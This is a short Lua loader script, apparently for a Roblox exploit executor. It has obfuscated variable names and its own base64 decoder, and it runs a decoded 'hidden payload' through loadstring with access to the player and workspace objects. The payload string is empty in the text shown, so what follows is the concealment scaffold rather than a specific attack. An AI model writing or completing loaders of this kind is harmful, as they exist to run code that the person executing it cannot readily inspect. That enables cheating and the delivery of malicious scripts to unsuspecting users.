local _0x5f2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function _d(_data)
    _data = string.gsub(_data, '[^'.._0x5f2..'=]', '')
    return (_data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r, f = '', (_0x5f2:find(x) - 1)
        for i = 6, 1, -1 do r = r .. (f % 2^i - f % 2^(i - 1) > 0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d%d%d%d%d%d', function(x)
        local c = 0
        for i = 1, 8 do c = c + (x:sub(i, i) == '1' and 2^(8 - i) or 0) end
        return string.char(c)
    end))
end

local _payload = _d("")

-- Initializing execution environment
local _env = getgenv and getgenv() or _G
_env.player = game:GetService("Players").LocalPlayer
_env.workspace = game:GetService("Workspace")

-- Execute the hidden payload
local _success, _err = pcall(function()
    loadstring(_payload)()
end)

if not _success then
    warn("Bootstrap Error: " .. tostring(_err))
end
